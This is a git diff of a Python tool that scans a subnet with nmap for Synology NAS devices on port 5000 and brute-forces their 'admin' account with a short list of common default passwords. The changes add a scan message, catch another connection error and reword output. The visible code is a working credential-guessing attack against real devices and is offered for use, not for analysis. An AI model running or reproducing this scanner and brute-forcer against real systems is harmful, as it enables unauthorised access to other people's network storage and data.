@@ -11,6 +11,7 @@ port_list=['5000']
 pwd_list=['admin','1234','123456',]
 
 def scan(subnet):
+    print ("Scannining "+str(subnet)+" on port "+str(port_list))
     nmap = subprocess.check_output(['nmap', subnet, '-p', '5000', '--open'])
     ip_list = re.findall( r'[0-9]+(?:\.[0-9]+){3}', nmap.decode('ascii'))
     return ip_list
@@ -29,7 +30,7 @@ def force(nas_list):
                     browser["username"]="admin"
                     browser["passwd"]=pwd
                     response = browser.submit_selected()
-                except (mechanicalsoup.utils.LinkNotFoundError, requests.exceptions.SSLError) as e:
+                except (mechanicalsoup.utils.LinkNotFoundError, requests.exceptions.SSLError, requests.packages.urllib3.exceptions.ProtocolError) as e:
                     continue
 
                 if '"success" : true' in str(response.text):
@@ -55,7 +56,7 @@ def validate(ip_list):
 
 
 parser = argparse.ArgumentParser()
-parser.add_argument("-scan", help="Scan Provided Subnet for port 5000 and 5001", action="store")
+parser.add_argument("-scan", help="Scan Provided Subnet for port in Portlist", action="store")
 parser.add_argument("-validate",help="Validate if the provided IP address belongs to an Synology NAS", action="store")
 parser.add_argument("-force",help="Force Passwords for user admin", action="store")
 args = parser.parse_args()
@@ -63,7 +64,10 @@ args = parser.parse_args()
 if args.scan:
 
     ip_list = scan(args.scan)
-    print ("Following IPs do have Port 5000 or 5001 open: "+str(ip_list))
+    if not ip_list:
+        print ("Don't founnd open Ports "+str(port_list)+" for Scanned IPs ("+args.scan+")")    
+    else:
+       print ("IPs "+str(ip_list)+" have open Ports on"+str(port_list))
 
 if args.validate:
     if args.scan:
